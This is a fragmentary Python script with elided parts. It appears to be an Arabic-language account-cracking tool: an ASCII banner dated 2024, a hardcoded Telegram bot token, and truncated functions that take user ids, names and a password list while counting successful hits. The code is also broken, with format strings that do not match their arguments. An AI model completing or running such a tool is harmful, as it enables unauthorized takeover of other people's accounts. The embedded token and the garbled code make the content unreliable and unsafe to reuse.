...
token = ('6917490670:AAG8hHiTGE-bbXi1eg2MkT29PDqScYj2PRg')
print('✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓃬✧ ✦ ✧ ✦ ✧              \n  \n')
print('\x1b[2;34m✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦\n⠀⣤⣶⣶⣶⡶⠶⠶⠶⠶⠶⠶⠶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀\n⢸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⢸⣿⣿⣿⠇⠀⠀⢀⣿⣿⣿⣷⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⢸⣿⣿⡟⠀⠀⠀⠸⠿⠿⠿⠏⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⢸⣿⣿⠁⠀⠀⢀⣀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇\n⢸⣿⡟⠀⠀⢀⣿⣿⣿⣿⡀⠀⠀⢸⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⡇\n⢸⣿⠀⠀⠀⢸⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⠃⠈⣿⣿⣿⣿⣿⣿⡇\n⢸⣿⣶⣶⣶⣿⣿⣿⣿⣿⡿⠶⠶⠶⠿⠿⠁⠀⠀⠿⠿⠿⠿⠿⣿⡇\n⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣿⣿⡇\n⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡦⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⡇\n⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⣀⣄⠀⠀⢸⣿⣿⣿⣿⣿⡇\n⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣡⣴⣾⣿⣿⣷⣄⢸⣿⣿⣿⣿⣿⡇\n⠀⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠀\n\x1b[2;34m✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦\n    \n╔══╗░░░░╔╦╗░░╔═════╗.               \n║╚═╬════╬╣╠═╗║░▀░▀░║.               \n╠═╗║╔╗╔╗║║║╩╣║╚═══╝║.               \n╚══╩╝╚╝╚╩╩╩═╝╚═════╝.               \n    \nتاريخ تحديث الاداه 2024/6/2 🔥🇮🇶\n\n✦ ✧ ✦ ✧ ✦ ✧ ✦ ✧ ✦𓅓✧ ✦ ✧ ✦ ✧ ✦ ✧  )\n\n   『@TO_LS』  ☞ 『لُـِـِِـِِِـِِـِـوُفُـ,ـي』                 \n\n')
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [G_GLV] '%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [G_GLV] [%s] '%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
